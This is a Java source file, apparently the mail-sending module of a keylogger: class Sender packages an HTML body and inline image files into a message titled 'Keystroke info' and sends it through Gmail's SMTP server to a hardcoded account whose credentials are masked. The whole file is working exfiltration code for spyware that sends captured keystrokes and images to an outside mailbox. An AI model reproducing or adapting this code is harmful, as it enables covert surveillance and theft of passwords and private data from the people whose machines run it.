package handlers;

import java.io.IOException;
import java.util.Date;
import java.util.List;
import java.util.Properties;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;
import javax.mail.internet.MimeMultipart;


public class Sender
{
    private Sender(){}


    public static void sendMail(String emailBody, List<String> imageList) throws Throwable
    {
        String SENDER_GMAIL = "***";
        String SENDER_PASSWORD = "***";

        Properties props = System.getProperties();
        props.put("mail.smtp.port", "587");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");


        Session mailSession = Session.getInstance(props, new javax.mail.Authenticator()
        {
            @Override
            protected PasswordAuthentication getPasswordAuthentication()
            {
                return new PasswordAuthentication(SENDER_GMAIL, SENDER_PASSWORD);
            }
        });

        MimeBodyPart messageBodyPart = new MimeBodyPart();
        MimeMultipart mimeMultipart = new MimeMultipart();
        Message	mailMessage = new MimeMessage(mailSession);

        mailMessage.setFrom(new InternetAddress(SENDER_GMAIL));
        mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(SENDER_GMAIL));
        mailMessage.setSubject("Keystroke info");
        mailMessage.setSentDate(new Date());

        messageBodyPart.setContent(emailBody, "text/html");
        mimeMultipart.addBodyPart(messageBodyPart);

        if(imageList != null && imageList.size() > 0)
        {
            for(String image : imageList)
            {
                MimeBodyPart imagePart = new MimeBodyPart();
                imagePart.setHeader("Content-ID", "<" + image + ">");
                imagePart.setDisposition(MimeBodyPart.INLINE);

                try
                {
                    imagePart.attachFile(image);
                }
                catch (IOException ex)
                {
                    ex.printStackTrace();
                }

                mimeMultipart.addBodyPart(imagePart);
            }
        }

        mailMessage.setContent(mimeMultipart);

        Transport transport = mailSession.getTransport("smtp");
        try
        {
            transport.connect("smtp.gmail.com", SENDER_GMAIL, SENDER_PASSWORD);
            transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        }
        catch (NoSuchProviderException ex)
        {
            ex.printStackTrace();
        }
        finally
        {
            transport.close();
        }
    }
}